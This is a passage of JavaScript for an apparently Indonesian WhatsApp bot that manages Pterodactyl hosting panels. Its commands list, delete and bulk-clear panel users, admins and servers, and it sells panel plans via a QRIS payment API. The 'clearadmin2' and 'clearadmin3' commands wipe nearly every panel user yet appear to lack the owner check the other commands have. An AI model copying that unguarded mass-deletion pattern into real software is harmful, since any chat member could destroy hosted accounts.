 teks += `\n➡️ Ketik: *${prefix + command} ${res.meta.pagination.current_page + 1}* untuk halaman berikutnya.`;
 }

 // Kirim pesan
 await killuaXs.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: 'Killua Official market | secure 〽️',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat mengambil data server di Server 2.");
 }
}
break;


case 'listserver3':
{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)

 let page = parseInt(args[0]) || 1; // Default ke halaman 1 jika tidak ada input

 try {
 let f = await fetch(global.domain3 + `/api/application/servers?page=${page}`, {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": `Bearer ${global.apikey3}`
 }
 });

 let res = await f.json();

 // Cek jika API mengembalikan error
 if (res.errors) {
 return m.reply(`❌ Gagal mengambil data server:\n${JSON.stringify(res.errors[0], null, 2)}`);
 }

 let servers = res.data;

 // Jika tidak ada server ditemukan
 if (!servers || servers.length === 0) {
 return m.reply("❌ Tidak ada server yang ditemukan di Server 3.");
 }

 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // URL video/GIF

 let teks = `╭─❒ *List Server di Server 3*\n`;

 for (let server of servers) {
 let s = server.attributes;
 teks += `├ *ID Server*: ${s.id}\n`;
 teks += `├ *Nama*: ${s.name}\n`;
 teks += `├ *Deskripsi*: ${s.description || 'Tidak ada deskripsi'}\n`;
 teks += `├ *Status*: ${s.suspended ? 'Suspend' : 'Aktif'}\n`;
 teks += `├───────────────\n`;
 }

 teks += `╰─❒ *Halaman*: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 teks += ` *Total Server*: ${res.meta.pagination.total}\n`;

 // Navigasi halaman berikutnya
 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 teks += `\n➡️ Ketik: *${prefix + command} ${res.meta.pagination.current_page + 1}* untuk halaman berikutnya.`;
 }

 // Kirim pesan dengan multimedia
 await killuaXs.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: 'Killua Official market | secure 〽️',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat mengambil data server di Server 3.");
 }
 break;
}


case 'listuser3': {
    if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
    
    let page = parseInt(args[0]) || 1; // Halaman default ke 1 jika tidak ada input
    
    try {
        let f = await fetch(global.domain3 + "/api/application/users?page=" + page, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + global.apikey3
            }
        });

        let res = await f.json();

        // Jika terjadi error pada respons API
        if (res.errors) return m.reply(`❌ Gagal mengambil data user: ${JSON.stringify(res.errors[0], null, 2)}`);

        let users = res.data;
        if (!users || users.length === 0) return m.reply("❌ Tidak ada user yang ditemukan di server 3.");

        // Format pesan daftar user
        let messageText = "*Berikut adalah daftar pengguna di Server 3:*\n\n";
        for (let user of users) {
            let u = user.attributes;
            messageText += `🆔 *ID*: ${u.id}\n`;
            messageText += `🔹 *Username*: ${u.username}\n`;
            messageText += `📛 *Nama*: ${u.first_name} ${u.last_name}\n`;
            messageText += `📊 *Status*: ${u.server_limit === null ? 'Tidak aktif' : 'Aktif'}\n`;
            messageText += `-----------------------------\n`;
        }

        messageText += `📄 *Halaman*: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
        messageText += `👤 *Total User*: ${res.meta.pagination.total}\n`;

        // Kirim pesan
        await dhikaXs.sendMessage(m.chat, { text: messageText }, { quoted: m });

        // Navigasi ke halaman berikutnya
        if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
            m.reply(`➡️ Gunakan perintah *${prefix + command} ${parseInt(res.meta.pagination.current_page) + 1}* untuk melihat halaman selanjutnya.`);
        }
    } catch (err) {
        console.error(err);
        m.reply("❌ Terjadi kesalahan saat mengambil data user di server 3.");
    }
    break;
}

case 'listadmin3':
{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)

 let page = parseInt(args[0]) || 1; // Default ke halaman 1 jika tidak ada input
 try {
 let f = await fetch(global.domain3 + `/api/application/users?page=${page}`, {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": `Bearer ${global.apikey3}`
 }
 });

 let res = await f.json();

 // Jika tidak ada data admin
 if (!res.data || res.data.length === 0) {
 return m.reply(`❌ Tidak ditemukan admin di server 3 pada halaman ${page}.`);
 }

 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // URL video yang ingin digunakan

 let teks = `╭─❒ *List Admin Server 3*\n`;

 for (let user of res.data) {
 let u = user.attributes;
 if (u.root_admin) { // Cek jika user adalah admin
 teks += `├ *ID*: ${u.id}\n`;
 teks += `├ *Username*: ${u.username}\n`;
 teks += `├ *Name*: ${u.first_name} ${u.last_name}\n`;
 teks += `├ *Email*: ${u.email}\n`;
 teks += `├ *Status*: ${u.server_limit === null ? 'Inactive' : 'Active'}\n`;
 teks += `├───────────────\n`;
 }
 }

 teks += `╰─❒ *Halaman*: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 teks += ` *Total Admin*: ${res.meta.pagination.count}\n`;

 // Navigasi halaman
 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 teks += `\n➜ Ketik: *${prefix + command} ${res.meta.pagination.current_page + 1}* untuk halaman berikutnya.`;
 }

 // Kirim pesan
 await dhikaXs.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: 'Dhika Official market | secure 〽️',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat mengambil data admin server 3.");
 }
}
break;




case 'listuser2': {
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 
 let page = parseInt(args[0]) || 1; // Default halaman ke 1 jika tidak ada input
 
 try {
 let f = await fetch(global.domain2 + "/api/application/users?page=" + page, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2
 }
 });

 let res = await f.json();
 if (res.errors) return m.reply(`❌ Gagal mengambil data user: ${JSON.stringify(res.errors[0], null, 2)}`);
 
 let users = res.data;
 if (!users || users.length === 0) return m.reply("❌ Tidak ada user yang ditemukan di server 2.");

 let messageText = "*Berikut adalah daftar user di Server 2:*\n\n";
 for (let user of users) {
 let u = user.attributes;
 messageText += `🆔 *ID*: ${u.id} - *Status*: ${u.server_limit === null ? 'Tidak aktif' : 'Aktif'}\n`;
 messageText += `👤 *Username*: ${u.username}\n`;
 messageText += `📌 *Nama*: ${u.first_name} ${u.last_name}\n\n`;
 }

 messageText += `📄 *Halaman*: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 messageText += `🖥️ *Total User*: ${res.meta.pagination.total}\n`;

 // Kirim pesan
 await dhikaXs.sendMessage(m.chat, { text: messageText }, { quoted: m });

 // Navigasi ke halaman berikutnya
 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 m.reply(`➡️ Gunakan perintah *${prefix + command} ${parseInt(res.meta.pagination.current_page) + 1}* untuk melihat halaman selanjutnya.`);
 }
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat mengambil data user di server 2.");
 }
}
break;

case 'deladmin2': {
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 if (!args[0]) return m.reply(`Untuk melihat ID, silakan ketik ${prefix}listadmin2`);
 
 try {
 // Ambil daftar admin dari server 2
 let cek = await fetch(global.domain2 + "/api/application/users?page=1", {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2
 }
 });

 let res2 = await cek.json();
 let users = res2.data;
 let getid = null;
 let idadmin = null;

 // Looping untuk mencari admin berdasarkan ID
 for (let e of users) {
 if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
 getid = e.attributes.username;
 idadmin = e.attributes.id;

 // Hapus admin menggunakan ID yang ditemukan
 try {
 let delusr = await fetch(global.domain2 + `/api/application/users/${idadmin}`, {
 method: "DELETE",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2
 }
 });

 // Validasi apakah penghapusan berhasil
 if (!delusr.ok) {
 throw new Error('Gagal menghapus admin!');
 }

 m.reply(`✅ Berhasil menghapus admin panel *${getid}* dari server 2.`);
 } catch (err) {
 console.error(err);
 m.reply(`❌ Terjadi kesalahan saat mencoba menghapus admin: ${err.message}`);
 }
 break;
 }
 }

 // Jika ID admin tidak ditemukan
 if (!getid) {
 m.reply("❌ Admin dengan ID tersebut tidak ditemukan di server 2 atau bukan root admin.");
 }
 } catch (err) {
 console.error(err);
 m.reply(`❌ Terjadi kesalahan saat mencoba mengambil data admin: ${err.message}`);
 }
}
break;

case 'delserver2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let srv = args[0]; // ID server yang ingin dihapus
 if (!srv) return m.reply('ID servernya mana?');

 try {
 // Kirim permintaan DELETE ke API server 2
 let f = await fetch(global.domain2 + "/api/application/servers/" + srv, {
 method: "DELETE",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2
 }
 });

 // Cek respons
 if (f.ok) {
 m.reply('✅ Sukses menghapus server dari server 2!');
 } else {
 let res = await f.json();
 let errorMessage = res.errors?.[0]?.detail || 'Server tidak ditemukan!';
 m.reply(`❌ Gagal menghapus server dari server 2: ${errorMessage}`);
 }
 } catch (e) {
 console.error(e);
 m.reply('❌ Terjadi kesalahan saat menghapus server dari server 2.');
 }
}
break;

case 'deladmin3': {
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
    if (!args[0]) return m.reply(`Untuk melihat ID, silakan ketik ${prefix}listadmin3`);
    
    try {
        // Ambil daftar admin dari server 3
        let cek = await fetch(global.domain3 + "/api/application/users?page=1", {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + global.apikey3
            }
        });

        let res3 = await cek.json();
        let users = res3.data;
        let getid = null;
        let idadmin = null;

        // Looping untuk mencari admin berdasarkan ID
        for (let e of users) {
            if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
                getid = e.attributes.username;
                idadmin = e.attributes.id;

                // Hapus admin menggunakan ID yang ditemukan
                try {
                    let delusr = await fetch(global.domain3 + `/api/application/users/${idadmin}`, {
                        method: "DELETE",
                        headers: {
                            Accept: "application/json",
                            "Content-Type": "application/json",
                            Authorization: "Bearer " + global.apikey3
                        }
                    });

                    // Validasi apakah penghapusan berhasil
                    if (!delusr.ok) {
                        throw new Error('Gagal menghapus admin!');
                    }

                    m.reply(`✅ Berhasil menghapus admin panel *${getid}* dari server 3.`);
                } catch (err) {
                    console.error(err);
                    m.reply(`❌ Terjadi kesalahan saat mencoba menghapus admin: ${err.message}`);
                }
                break;
            }
        }

        // Jika ID admin tidak ditemukan
        if (!idadmin) {
            m.reply(`❌ Tidak ditemukan admin dengan ID ${args[0]} di server 3.`);
        }
    } catch (error) {
        console.error(error);
        m.reply(`❌ Terjadi kesalahan: ${error.message}`);
    }
    break;
}

case 'deluser2': {
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 let usr = args[0]; // ID user yang ingin dihapus
 if (!usr) return m.reply('ID usernya mana?');

 try {
 // Kirim permintaan DELETE ke API server 2
 let f = await fetch(global.domain2 + "/api/application/users/" + usr, {
 method: "DELETE",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2
 }
 });

 // Cek respons
 if (f.ok) {
 m.reply('✅ Sukses menghapus user dari server 2!');
 } else {
 let res = await f.json();
 let errorMessage = res.errors?.[0]?.detail || 'User tidak ditemukan!';
 m.reply(`❌ Gagal menghapus user dari server 2: ${errorMessage}`);
 }
 } catch (e) {
 console.error(e);
 m.reply('❌ Terjadi kesalahan saat menghapus user dari server 2.');
 }
}
break;

case 'deluser3': {
    if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
    let usr = args[0]; // ID user yang ingin dihapus
    if (!usr) return m.reply('ID usernya mana?');

    try {
        // Kirim permintaan DELETE ke API server 3
        let f = await fetch(global.domain3 + "/api/application/users/" + usr, {
            method: "DELETE",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + global.apikey3
            }
        });

        // Cek respons
        if (f.ok) {
            m.reply('✅ Sukses menghapus user dari server 3!');
        } else {
            let res = await f.json();
            let errorMessage = res.errors?.[0]?.detail || 'User tidak ditemukan!';
            m.reply(`❌ Gagal menghapus user dari server 3: ${errorMessage}`);
        }
    } catch (e) {
        console.error(e);
        m.reply('❌ Terjadi kesalahan saat menghapus user dari server 3.');
    }
    break;
}

case 'clearadmin2': {
    const argsString = body.trim();
    const excludeIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludeIds.length === 0) {
        return m.reply('Tolong masukkan ID user yang ingin dikecualikan setelah tanda koma.\nContoh: .clearadmin2 , 48, 49, 50');
    }

    try {
        // Mengambil data user dari server 2
        let f = await fetch(global.domain2 + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikey2
            }
        });

        let res = await f.json();
        let users = res.data;

        if (!users || users.length === 0) {
            return m.reply('Tidak ada user yang ditemukan di server 2.');
        }

        for (let user of users) {
            let u = user.attributes;

            // Jika ID user ada di daftar pengecualian, lewati
            if (excludeIds.includes(u.id.toString())) {
                m.reply(`Mengabaikan user dengan ID: ${u.id} (${u.username})\n> *_© Developer : DhikaDev*`);
                continue;
            }

            // Menghapus user dari server 2
            let deleteUser = await fetch(global.domain2 + "/api/application/users/" + u.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + global.apikey2
                }
            });

            if (deleteUser.ok) {
                m.reply(`Berhasil menghapus user dengan ID: ${u.id} (${u.username})\n> *_© Developer : DhikaDev*`);
            } else {
                let errorText = await deleteUser.text();
                m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
            }
        }

        m.reply('Semua user, kecuali yang dikecualikan, berhasil dihapus di server 2!');
    } catch (error) {
        return m.reply('Terjadi kesalahan: ' + error.message);
    }
    break;
}

case 'delserver3': {
    if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
    let srv = args[0]; // ID server yang ingin dihapus
    if (!srv) return m.reply('ID servernya mana?');

    try {
        // Kirim permintaan DELETE ke API server 3
        let f = await fetch(global.domain3 + "/api/application/servers/" + srv, {
            method: "DELETE",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + global.apikey3
            }
        });

        // Cek respons
        if (f.ok) {
            m.reply('✅ Sukses menghapus server dari server 3!');
        } else {
            let res = await f.json();
            let errorMessage = res.errors?.[0]?.detail || 'Server tidak ditemukan!';
            m.reply(`❌ Gagal menghapus server dari server 3: ${errorMessage}`);
        }
    } catch (e) {
        console.error(e);
        m.reply('❌ Terjadi kesalahan saat menghapus server dari server 3.');
    }
    break;
}

case 'clearadmin3': {
    const argsString = body.trim();
    const excludeIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludeIds.length === 0) {
        return m.reply('Tolong masukkan ID user yang ingin dikecualikan setelah tanda koma.\nContoh: .clearadmin3 , 48, 49, 50');
    }

    try {
        // Mengambil data user dari server 3
        let f = await fetch(global.domain3 + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikey3
            }
        });

        let res = await f.json();
        let users = res.data;

        if (!users || users.length === 0) {
            return m.reply('Tidak ada user yang ditemukan di server 3.');
        }

        for (let user of users) {
            let u = user.attributes;

            // Jika ID user ada di daftar pengecualian, lewati
            if (excludeIds.includes(u.id.toString())) {
                m.reply(`Mengabaikan user dengan ID: ${u.id} (${u.username})\n> *_© Developer : KilluaDev*`);
                continue;
            }

            // Menghapus user dari server 3
            let deleteUser = await fetch(global.domain3 + "/api/application/users/" + u.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + global.apikey3
                }
            });

            if (deleteUser.ok) {
                m.reply(`Berhasil menghapus user dengan ID: ${u.id} (${u.username})\n> *_© Developer : DhikaDev*`);
            } else {
                let errorText = await deleteUser.text();
                m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
            }
        }

        m.reply('Semua user, kecuali yang dikecualikan, berhasil dihapus di server 3!');
    } catch (error) {
        return m.reply('Terjadi kesalahan: ' + error.message);
    }
    break;
}
case 'buypanel': {
    try {
        // Validasi awal
        if (!m || !m.chat || !m.sender) {
            console.error('Error: Objek m atau properti m.sender tidak ditemukan.');
            return m.reply('Terjadi kesalahan pada sistem. Silakan coba lagi nanti.');
        }

        // Pastikan pengguna ada di database
        if (!db.users) db.users = {};
        if (!db.users[m.sender]) {
            db.users[m.sender] = {
                status_deposit: false, // Status transaksi default
                balance: 0,           // Saldo awal pengguna
                createdAt: Date.now() // Waktu pendaftaran pengguna
            };
            console.log(`Data pengguna untuk ${m.sender} telah dibuat.`);
        }

        if (m.isGroup) return m.reply("*[ System Notice ]* Pembelian panel hanya bisa dilakukan di private chat.");
        if (db.users[m.sender].status_deposit) {
            return m.reply("*[ System Notice ]* Masih ada transaksi yang belum diselesaikan. Ketik *.batalbeli* untuk membatalkan transaksi sebelumnya.");
        }

        const ramPackages = {
            "1gb": { ram: "1000", disk: "1000", cpu: "40", harga: "1000" },
            "2gb": { ram: "2000", disk: "1000", cpu: "60", harga: "2000" },
            "3gb": { ram: "3000", disk: "2000", cpu: "80", harga: "3000" },
            "4gb": { ram: "4000", disk: "2000", cpu: "100", harga: "4000" },
            "5gb": { ram: "5000", disk: "3000", cpu: "120", harga: "5000" },
            "6gb": { ram: "6000", disk: "3000", cpu: "140", harga: "6000" },
            "7gb": { ram: "7000", disk: "4000", cpu: "160", harga: "7000" },
            "8gb": { ram: "8000", disk: "4000", cpu: "180", harga: "8000" },
            "9gb": { ram: "9000", disk: "5000", cpu: "200", harga: "9000" },
            "10gb": { ram: "10000", disk: "5000", cpu: "220", harga: "10000" },
            "unlimited": { ram: "0", disk: "0", cpu: "0", harga: "12000" }
        };

        const teks = `
*#- Detail Ram Yang Tersedia*
* 1gb
* 2gb
* 3gb
* 4gb
* 5gb
* 6gb
* 7gb
* 8gb
* 9gb
* 10gb
* Unlimited

*#- Selalu Berhati - Hati Jika Melakukan Transaksi Terima Kasih*
        `;

        if (!text) return m.reply(teks);

        const cmd = text.toLowerCase();
        const Obj = ramPackages[cmd] || (cmd === "unli" ? ramPackages["unlimited"] : null);
        if (!Obj) return m.reply(teks);

        // Perhitungan harga
        const amount = Number(Obj.harga);
        const fee = Math.floor(Math.random() * 10);
        const totalAmount = amount + fee;

        // Pembuatan pembayaran
        let pay;
        try {
            const paymentResponse = await fetch(`https://api.abidev.tech/api/orkut/createpayment?amount=${totalAmount}&codeqr=${global.Merchant}`);
            pay = await paymentResponse.json();

            if (!pay || !pay.result || !pay.result.transactionId) {
                throw new Error("Invalid payment response");
            }
        } catch (paymentError) {
            console.error('Payment API Error:', paymentError);
            return m.reply('Gagal membuat pembayaran. Silakan coba lagi atau hubungi admin.');
        }

        // Waktu pembayaran (Jakarta)
        const jakartaTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
        const expirationTime = new Date(jakartaTime.getTime() + 5 * 60 * 1000);
        const formattedTime = `${expirationTime.getHours().toString().padStart(2, '0')}:${expirationTime.getMinutes().toString().padStart(2, '0')}`;

        // Detail pembayaran
        const paymentDetails = `*☆ DETAIL TRANSAKSI ☆*

╭——⪼
│• *Id Transaksi* : ${pay.result.transactionId}
│• *Jumlah Transaksi* : Rp. ${amount}
│• *Expired Time* : ${formattedTime} WIB
│• *Biaya Admin* : ${fee}
│• *Total Transaksi* : ${totalAmount}
╰——⪼

*☆ Detail Produk Anda ☆*
* [-] Beli Panel Pterodactyl Ram ${Obj.ram}
* [-] Harga : ${amount}
* [-] Ram : ${Obj.ram}
* [-] Cpu : ${Obj.cpu}`;

        const qrMessage = await dhikaXs.sendMessage(m.chat, {
            image: { url: pay.result.qrImageUrl },
            caption: paymentDetails
        }, { quoted: m });

        // Mengecek status pembayaran
        const apiUrl = `https://api.abidev.tech/api/orkut/cekstatus?merchant=${global.idOrkut}&keyorkut=${global.ApiOrkut}`;
        let isTransactionComplete = false;
        const maxWaitTime = 5 * 60 * 1000;
        const startTime = Date.now();

        while (!isTransactionComplete && Date.now() - startTime < maxWaitTime) {
            try {
                const response = await axios.get(apiUrl);
                const result = response.data;

                if (result?.amount && parseInt(result.amount) === totalAmount) {
                    await dhikaXs.sendMessage(m.chat, { delete: qrMessage.key });
                    await createPanelServer(Obj, m, totalAmount);
                    isTransactionComplete = true;
                    break;
                }
            } catch (statusError) {
                console.error('Error checking payment status:', statusError);
            }
            await new Promise(resolve => setTimeout(resolve, 10000)); // Delay 10 detik
        }

        if (!isTransactionComplete) {
            return m.reply('Waktu pembayaran habis. Silakan coba lagi.');
        }
    } catch (error) {
        console.error('Error in buypanel case:', error);
        return m.reply('Terjadi kesalahan. Silakan coba lagi atau hubungi admin.');
    }
    break;
}

case 'clearuser': {
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 
 try {
 // Mengambil daftar user
 let f = await fetch(domain + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey,
 }
 });

 let res = await f.json();
 let users = res.data;

 if (!users || users.length === 0) {
 return m.reply('Tidak ada user yang ditemukan.');
 }

 // Loop melalui setiap user
 for (let user of users) {
 let u = user.attributes;

 // Hanya hapus user yang bukan admin (root_admin = false)
 if (!u.root_admin) {
 let deleteUser = await fetch(domain + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey,
 }
 });

 // Cek status penghapusan user
 if (deleteUser.ok) {
 m.reply(`*Berhasil menghapus user dengan ID: ${u.id}*`);
 } else {
 let errorText = await deleteUser.text();
 m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 }

 m.reply('*Semua user kecuali admin berhasil dihapus!*');
 } catch (error) {
 return m.reply('Terjadi kesalahan: ' + error.message);
 }
 break;
}

case 'clearuser2': {
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 
 try {
 // Mengambil daftar user dari server 2
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey2,
 }
 });

 let res = await f.json();
 let users = res.data;

 if (!users || users.length === 0) {
 return m.reply('Tidak ada user yang ditemukan di server 2.');
 }

 // Loop melalui setiap user
 for (let user of users) {
 let u = user.attributes;

 // Hanya hapus user yang bukan admin (root_admin = false)
 if (!u.root_admin) {
 let deleteUser = await fetch(global.domain2 + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey2,
 }
 });

 // Cek status penghapusan user
 if (deleteUser.ok) {
 m.reply(`*Berhasil menghapus user dengan ID: ${u.id}* dari server 2`);
 } else {
 let errorText = await deleteUser.text();
 m.reply(`Gagal menghapus user dengan ID: ${u.id} dari server 2. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 }

 m.reply('*Semua user kecuali admin berhasil dihapus dari server 2!*');
 } catch (error) {
 return m.reply('Terjadi kesalahan: ' + error.message);
 }
 break;
}

case 'clearuser3': {
    if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)

    try {
        // Mengambil daftar user dari server 3
        let f = await fetch(global.domain3 + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikey3,
            }
        });

        let res = await f.json();
        let users = res.data;

        if (!users || users.length === 0) {
            return m.reply('Tidak ada user yang ditemukan di server 3.');
        }

        // Loop melalui setiap user
        for (let user of users) {
            let u = user.attributes;

            // Hanya hapus user yang bukan admin (root_admin = false)
            if (!u.root_admin) {
                let deleteUser = await fetch(global.domain3 + "/api/application/users/" + u.id, {
                    method: "DELETE",
                    headers: {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + global.apikey3,
                    }
                });

                // Cek status penghapusan user
                if (deleteUser.ok) {
                    m.reply(`*Berhasil menghapus user dengan ID: ${u.id}* dari server 3`);
                } else {
                    let errorText = await deleteUser.text();
                    m.reply(`Gagal menghapus user dengan ID: ${u.id} dari server 3. Error: ${deleteUser.status} - ${errorText}`);
                }
            }
        }

        m.reply('*Semua user kecuali admin berhasil dihapus dari server 3!*');
    } catch (error) {
        return m.reply('Terjadi kesalahan: ' + error.message);
    }
    break;
}

case 'batalbeli': {
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
if (m.quoted.sender == botNumber) {
dhikaXs.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
m.reply("*[ System Notice ]* Done Membatalkan Membeli")
} else {
dhikaXs.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
m.reply("*[ System Notice ]* Done Menghapus Teks")
}}
break

case 'buyresellerpanel': {
    try {
        // Pastikan db.users adalah objek valid
        if (!db.users) db.users = {};

        // Cek dan inisialisasi data pengguna jika belum ada
        if (!db.users[m.sender]) {
            db.users[m.sender] = { status_deposit: false };
        }

        // Validasi awal: cek apakah perintah dikirim di grup
        if (m.isGroup) {
            return m.reply("*[ System Notice ]* Pembelian reseller panel pterodactyl hanya bisa di dalam private chat.");
        }

        // Cek status deposit pengguna
        if (db.users[m.sender].status_deposit) {
            return m.reply("*[ System Notice ]* Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");
        }

        // Paket reseller panel
        const adminPackages = {
            "permanen": { 
                level: "resellerpanel", 
                access: "Limited", 
                harga: 15000 
            }
        };

        const teks = `
*#- Detail Paket Reseller Panel Tersedia*
* Permanen (Rp. 15.000)

.buyresellerpanel permanen

*#- Selalu Berhati - Hati Jika Melakukan Transaksi Terima Kasih*
        `;
        
        // Jika tidak ada teks yang diberikan, kirim informasi paket
        if (!text) {
            return m.reply(teks);
        }

        const cmd = text.toLowerCase();
        const selectedPackage = adminPackages[cmd];
        if (!selectedPackage) {
            return m.reply(teks);
        }

        // Hitung biaya total
        const amount = Number(selectedPackage.harga);
        const fee = Math.floor(Math.random() * 10); // Biaya admin acak
        const totalAmount = amount + fee;

        // Proses permintaan pembayaran
        let paymentResponse;
        try {
            const paymentRequest = await fetch(`https://api.abidev.tech/api/orkut/createpayment?amount=${totalAmount}&codeqr=${global.Merchant}`);
            paymentResponse = await paymentRequest.json();

            if (!paymentResponse?.result?.transactionId) {
                throw new Error("Invalid payment response");
            }
        } catch (paymentError) {
            console.error('Payment API Error:', paymentError);
            return m.reply('Gagal membuat pembayaran. Silakan coba lagi atau hubungi admin.');
        }

        // Waktu transaksi
        const jakartaTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
        const expirationTime = new Date(jakartaTime.getTime() + 5 * 60 * 1000); // 5 menit
        const formattedTime = `${expirationTime.getHours().toString().padStart(2, '0')}:${expirationTime.getMinutes().toString().padStart(2, '0')}`;

        // Detail pembayaran
        const paymentDetails = `*DETAIL TRANSAKSI*

╭——⪼
│• *Id Transaksi* : ${paymentResponse.result.transactionId}
│• *Jumlah Transaksi* : Rp. ${amount}
│• *Expired Time* : ${formattedTime} WIB
│• *Biaya Admin* : ${fee}
│• *Total Transaksi* : ${totalAmount}
╰——⪼

*☆ Detail Produk Anda ☆*
* [-] Beli Admin Panel Pterodactyl
* [-] Level Akses : ${selectedPackage.level}
